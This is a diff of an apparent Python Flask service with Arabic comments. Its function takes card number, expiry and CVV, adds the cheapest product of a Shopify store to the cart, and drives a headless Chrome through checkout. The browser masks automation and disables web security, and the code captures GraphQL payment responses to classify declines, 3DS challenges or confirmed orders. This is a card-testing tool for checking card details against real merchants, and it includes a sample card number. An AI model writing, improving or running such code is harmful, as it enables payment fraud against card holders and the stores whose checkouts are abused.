@@ -1,4 +1,4 @@
-# app.py - ملف API خارق مع تحمل ضغط رهيب جدا
+# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة
 import time
 import re
 import json
@@ -17,158 +17,24 @@ import threading
 import queue
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import logging
-from selenium.webdriver.chrome.service import Service
-import chromedriver_autoinstaller
-import gc
-import psutil
 
 app = Flask(__name__)
 
-# ==================== إعدادات الأداء الخارقة ====================
+# ==================== إعدادات الأداء ====================
 MAX_WORKERS = 50
-REQUEST_TIMEOUT = 30
+REQUEST_TIMEOUT = 60
 TASK_QUEUE = queue.Queue()
 executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
 
-# ==================== إعدادات إعادة استخدام المتصفح ====================
-DRIVER_POOL = []
-POOL_LOCK = threading.Lock()
-MAX_DRIVERS = 25
-DRIVER_LAST_USED = {}
-
-# ==================== إعدادات توفير الذاكرة ====================
-MEMORY_LIMIT = 85
-CLEANUP_INTERVAL = 50
-REQUEST_COUNT = 0
-
-logging.basicConfig(level=logging.WARNING)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
-
-# ==================== تثبيت ChromeDriver تلقائياً ====================
-try:
-    chromedriver_autoinstaller.install()
-    logger.info("✅ تم تثبيت ChromeDriver تلقائياً")
-except:
-    logger.warning("⚠️ فشل تثبيت ChromeDriver تلقائياً")
-
-def check_memory():
-    try:
-        memory = psutil.virtual_memory()
-        if memory.percent > MEMORY_LIMIT:
-            logger.warning(f"⚠️ الذاكرة مرتفعة: {memory.percent}% - جاري التنظيف...")
-            cleanup_drivers()
-            gc.collect()
-            return True
-    except:
-        pass
-    return False
-
-def cleanup_drivers():
-    with POOL_LOCK:
-        to_remove = []
-        current_time = time.time()
-        for i, driver in enumerate(DRIVER_POOL):
-            try:
-                last_used = DRIVER_LAST_USED.get(id(driver), current_time)
-                if current_time - last_used > 30:
-                    driver.quit()
-                    to_remove.append(i)
-            except:
-                to_remove.append(i)
-        
-        for i in sorted(to_remove, reverse=True):
-            if i < len(DRIVER_POOL):
-                DRIVER_POOL.pop(i)
-        
-        logger.info(f"🧹 تم تنظيف {len(to_remove)} متصفحات")
-        gc.collect()
-
-def get_driver_from_pool():
-    global REQUEST_COUNT
-    REQUEST_COUNT += 1
-    
-    if REQUEST_COUNT % CLEANUP_INTERVAL == 0:
-        cleanup_drivers()
-        check_memory()
-    
-    with POOL_LOCK:
-        for driver in DRIVER_POOL:
-            try:
-                driver.current_url
-                DRIVER_LAST_USED[id(driver)] = time.time()
-                return driver
-            except:
-                continue
-        
-        if len(DRIVER_POOL) < MAX_DRIVERS:
-            driver = create_driver()
-            DRIVER_POOL.append(driver)
-            DRIVER_LAST_USED[id(driver)] = time.time()
-            return driver
-        
-        time.sleep(0.3)
-        return get_driver_from_pool()
-
-def create_driver():
-    """إنشاء متصفح جديد مع ChromeDriver متوافق"""
-    chrome_options = Options()
-    
-    chrome_options.add_argument('--headless')
-    chrome_options.add_argument('--no-sandbox')
-    chrome_options.add_argument('--disable-dev-shm-usage')
-    chrome_options.add_argument('--disable-gpu')
-    chrome_options.add_argument('--disable-images')
-    chrome_options.add_argument('--blink-settings=imagesEnabled=false')
-    chrome_options.add_argument('--disable-extensions')
-    chrome_options.add_argument('--disable-plugins')
-    chrome_options.add_argument('--disable-background-networking')
-    chrome_options.add_argument('--disable-sync')
-    chrome_options.add_argument('--disable-default-apps')
-    chrome_options.add_argument('--disable-translate')
-    chrome_options.add_argument('--disable-print-preview')
-    chrome_options.add_argument('--disable-prompt-on-repost')
-    chrome_options.add_argument('--disable-hang-monitor')
-    chrome_options.add_argument('--disable-client-side-phishing-detection')
-    chrome_options.add_argument('--disable-crash-reporter')
-    chrome_options.add_argument('--disable-component-update')
-    chrome_options.add_argument('--disable-domain-reliability')
-    chrome_options.add_argument('--disable-breakpad')
-    chrome_options.add_argument('--disable-back-forward-cache')
-    chrome_options.add_argument('--disable-backgrounding-occluded-windows')
-    chrome_options.add_argument('--disable-renderer-backgrounding')
-    chrome_options.add_argument('--disable-field-trial-config')
-    chrome_options.add_argument('--disable-ipc-flooding-protection')
-    chrome_options.add_argument('--enable-features=NetworkService,NetworkServiceInProcess')
-    chrome_options.add_argument('--disable-features=TranslateUI')
-    chrome_options.add_argument('--disable-blink-features=AutomationControlled')
-    chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
-    chrome_options.add_experimental_option('useAutomationExtension', False)
-    chrome_options.add_argument('--disable-web-security')
-    chrome_options.add_argument('--disable-features=IsolateOrigins,site-per-process')
-    chrome_options.add_argument('--disable-popup-blocking')
-    chrome_options.add_argument('--disable-notifications')
-    chrome_options.add_argument('--max_old_space_size=512')
-    chrome_options.add_argument('--js-flags=--max_old_space_size=512')
-    
-    try:
-        service = Service()
-    except:
-        try:
-            service = Service("/usr/local/bin/chromedriver")
-        except:
-            service = Service("/usr/bin/chromedriver")
-    
-    driver = webdriver.Chrome(service=service, options=chrome_options)
-    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-    driver.set_page_load_timeout(10)
-    driver.implicitly_wait(2)
-    
-    return driver
 
 def ff(ccx, site):
     """
     ccx: رقم البطاقة|الشهر|السنة|cvv
+    مثال: '4918460118934875|08|2027|293'
     site: رابط الموقع
+    مثال: 'https://www.militadowatch.com/'
     """
     
     shipping_data = {
@@ -221,7 +87,7 @@ def ff(ccx, site):
             'service', 'guarantee', 'support'
         ]
         
-        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=5)
+        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=10)
         if r.status_code != 200:
             return {"success": False, "code": None, "error": "Failed to fetch products"}
         
@@ -260,11 +126,11 @@ def ff(ccx, site):
         variant_id = cheapest['variant_id']
         total_amount = f"${cheapest['price']:.2f}"
         
-        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=5)
+        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=10)
         if resp.status_code != 200:
             return {"success": False, "code": None, "error": "Failed to add to cart"}
         
-        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=5)
+        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=10)
         checkout_url = response.url
         
     except Exception as e:
@@ -273,25 +139,41 @@ def ff(ccx, site):
     # ==================== 2. تشغيل المتصفح ====================
     driver = None
     try:
-        driver = get_driver_from_pool()
-        wait = WebDriverWait(driver, 3)
+        chrome_options = Options()
+        chrome_options.add_argument('--headless')
+        chrome_options.add_argument('--no-sandbox')
+        chrome_options.add_argument('--disable-dev-shm-usage')
+        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
+        chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
+        chrome_options.add_experimental_option('useAutomationExtension', False)
+        chrome_options.add_argument('--disable-web-security')
+        chrome_options.add_argument('--disable-features=IsolateOrigins,site-per-process')
+        chrome_options.add_argument('--disable-popup-blocking')
+        chrome_options.add_argument('--disable-gpu')
+        chrome_options.add_argument('--disable-notifications')
+        chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})
+        
+        driver = webdriver.Chrome(options=chrome_options)
+        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+        wait = WebDriverWait(driver, 15)
+        driver.set_page_load_timeout(25)
         
         driver.get(checkout_url)
-        time.sleep(0.3)
+        time.sleep(2)
         
         # ==================== 3. تعبئة الشحن ====================
         try:
             email_field = wait.until(EC.presence_of_element_located((By.ID, "email")))
             email_field.clear()
             email_field.send_keys(shipping_data["email"])
-            time.sleep(0.1)
+            time.sleep(1.5)
             
             try:
                 country_select = driver.find_element(By.NAME, "countryCode")
                 current_country = country_select.get_attribute('value')
                 if current_country != "US":
                     Select(country_select).select_by_value("US")
-                    time.sleep(0.1)
+                    time.sleep(0.5)
             except:
                 pass
             
@@ -324,10 +206,10 @@ def ff(ccx, site):
                 except:
                     pass
             
-            time.sleep(0.1)
+            time.sleep(0.5)
             continue_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']")))
             driver.execute_script("arguments[0].click();", continue_btn)
-            time.sleep(0.3)
+            time.sleep(2)
             
         except:
             return {"success": False, "code": None, "error": "Shipping fill failed"}
@@ -335,7 +217,7 @@ def ff(ccx, site):
         # ==================== 4. تعبئة الدفع ====================
         try:
             driver.switch_to.default_content()
-            time.sleep(0.1)
+            time.sleep(0.5)
             
             iframes = driver.find_elements(By.TAG_NAME, 'iframe')
             
@@ -365,7 +247,7 @@ def ff(ccx, site):
                                 arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                             """, input_elem, card_data["number"])
                             card_filled = True
-                            time.sleep(0.05)
+                            time.sleep(0.2)
                         
                         elif not expiry_filled and (data_field == 'expiry' or 'expiry' in placeholder.lower() or autocomplete == 'cc-exp'):
                             driver.execute_script("""
@@ -377,7 +259,7 @@ def ff(ccx, site):
                                 arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                             """, input_elem, card_data["expiry"])
                             expiry_filled = True
-                            time.sleep(0.05)
+                            time.sleep(0.2)
                         
                         elif not cvv_filled and (data_field == 'cvv' or 'cvv' in placeholder.lower() or autocomplete == 'cc-csc'):
                             driver.execute_script("""
@@ -389,7 +271,7 @@ def ff(ccx, site):
                                 arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                             """, input_elem, card_data["cvv"])
                             cvv_filled = True
-                            time.sleep(0.05)
+                            time.sleep(0.2)
                         
                         elif not name_filled and (data_field == 'name' or 'name' in placeholder.lower() or autocomplete == 'cc-name'):
                             driver.execute_script("""
@@ -401,7 +283,7 @@ def ff(ccx, site):
                                 arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                             """, input_elem, card_data["name"])
                             name_filled = True
-                            time.sleep(0.05)
+                            time.sleep(0.2)
                     
                     driver.switch_to.default_content()
                     
@@ -418,11 +300,12 @@ def ff(ccx, site):
         except:
             return {"success": False, "code": None, "error": "Payment error"}
         
-        # ==================== 5. اعتراض GraphQL (بدون performance logs) ====================
+        # ==================== 5. اعتراض GraphQL ====================
         try:
             script = """
             window.graphqlResponses = [];
             window.allResponses = [];
+            window.pageUrls = [];
             
             var originalFetch = window.fetch;
             window.fetch = function(url, options) {
@@ -469,13 +352,19 @@ def ff(ccx, site):
                 });
                 return originalXHRSend.apply(this, arguments);
             };
+            
+            var originalPushState = history.pushState;
+            history.pushState = function(state, title, url) {
+                window.pageUrls.push(url);
+                return originalPushState.apply(this, arguments);
+            };
             """
             driver.execute_script(script)
-            time.sleep(0.2)
+            time.sleep(0.5)
             
             # ==================== 6. الضغط على Pay ====================
             driver.switch_to.default_content()
-            time.sleep(0.3)
+            time.sleep(1)
             
             pay_selectors = [
                 "//button[contains(text(), 'Pay now')]",
@@ -520,6 +409,7 @@ def ff(ccx, site):
             is_3ds = False
             order_confirmed = False
             order_number = None
+            payment_status = None
             
             excluded_codes = [
                 'REQUIRED_ARTIFACTS_UNAVAILABLE',
@@ -537,22 +427,26 @@ def ff(ccx, site):
                 'Free Postal Shipping',
                 'UPS',
                 'DELIVERY_PHONE_NUMBER_REQUIRED',
-                'Economy',
-                'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 
-                'First', 
-                'by-items', 
-                'Standard', 
-                'Priority', 
-                'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 
-                'GroundAdvantage'
+             'Economy',
+             'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 
+            'First', 
+            'by-items', 
+            'Standard', 
+            'Priority', 
+            'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 
+            'GroundAdvantage'
+           
+             
             ]
             
-            for attempt in range(3):
-                time.sleep(0.8)
+            for attempt in range(10):
+                time.sleep(1.5)
                 
                 responses = driver.execute_script("return window.allResponses || [];")
                 current_url = driver.current_url
                 final_url = current_url
+                
+                page_urls = driver.execute_script("return window.pageUrls || [];")
                 
                 if '/thank_you' in current_url:
                     order_confirmed = True
@@ -588,6 +482,11 @@ def ff(ccx, site):
                         if order_match:
                             order_number = order_match.group(1)
                         break
+                    
+                    order_match = re.search(r'Order #?([A-Z0-9]+)', page_source, re.IGNORECASE)
+                    if order_match:
+                        order_number = order_match.group(1)
+                        
                 except:
                     pass
                 
@@ -747,6 +646,68 @@ def ff(ccx, site):
                 
                 final_url = driver.current_url
             
+            if not found_code and not all_codes and not order_confirmed:
+                logs = driver.get_log('performance')
+                for log in logs:
+                    try:
+                        message = json.loads(log['message'])
+                        if message.get('message', {}).get('method') == 'Network.responseReceived':
+                            url = message.get('message', {}).get('params', {}).get('response', {}).get('url', '')
+                            if '/persisted' in url and 'graphql' in url:
+                                request_id = message.get('message', {}).get('params', {}).get('requestId')
+                                if request_id:
+                                    try:
+                                        response = driver.execute_cdp_cmd('Network.getResponseBody', {'requestId': request_id})
+                                        body = response.get('body', '')
+                                        if body:
+                                            if 'CompletePaymentChallenge' in body:
+                                                try:
+                                                    data = json.loads(body)
+                                                    if 'data' in data and 'receipt' in data['data']:
+                                                        receipt = data['data']['receipt']
+                                                        if 'action' in receipt:
+                                                            action = receipt['action']
+                                                            if action.get('__typename') == 'CompletePaymentChallenge':
+                                                                is_3ds = True
+                                                                found_code = '3DS_REQUIRED'
+                                                                found_typename = 'CompletePaymentChallenge'
+                                                                response_result = '3DS Secure required - Please complete authentication'
+                                                                break
+                                                except:
+                                                    pass
+                                            if not found_code:
+                                                pattern = r'"code"\s*:\s*"([^"]+)"'
+                                                matches = re.findall(pattern, body, re.IGNORECASE)
+                                                for code in matches:
+                                                    if len(code) > 3 and len(code) < 80 and ' ' not in code:
+                                                        is_excluded = False
+                                                        for excluded in excluded_codes:
+                                                            if excluded in code:
+                                                                is_excluded = True
+                                                                break
+                                                        if not is_excluded and code not in all_codes:
+                                                            all_codes.append(code)
+                                            if '__typename' in body:
+                                                pattern = r'"__typename"\s*:\s*"([^"]+)"'
+                                                matches = re.findall(pattern, body, re.IGNORECASE)
+                                                for typename in matches:
+                                                    if len(typename) > 3 and len(typename) < 80:
+                                                        if typename not in ['Query', 'Mutation', 'Subscription']:
+                                                            if typename not in all_typenames:
+                                                                all_typenames.append(typename)
+                                    except:
+                                        pass
+                    except:
+                        continue
+            
+            try:
+                final_url = driver.current_url
+            except:
+                pass
+            
+            if driver:
+                driver.quit()
+            
             if order_confirmed:
                 result_code = 'ORDER_CONFIRMED'
                 result_typename = 'OrderConfirmed'
@@ -811,6 +772,8 @@ def ff(ccx, site):
                 }
         
         except Exception as e:
+            if driver:
+                driver.quit()
             return {
                 "success": False,
                 "code": None,
@@ -824,6 +787,8 @@ def ff(ccx, site):
             }
     
     except Exception as e:
+        if driver:
+            driver.quit()
         return {
             "success": False,
             "code": None,
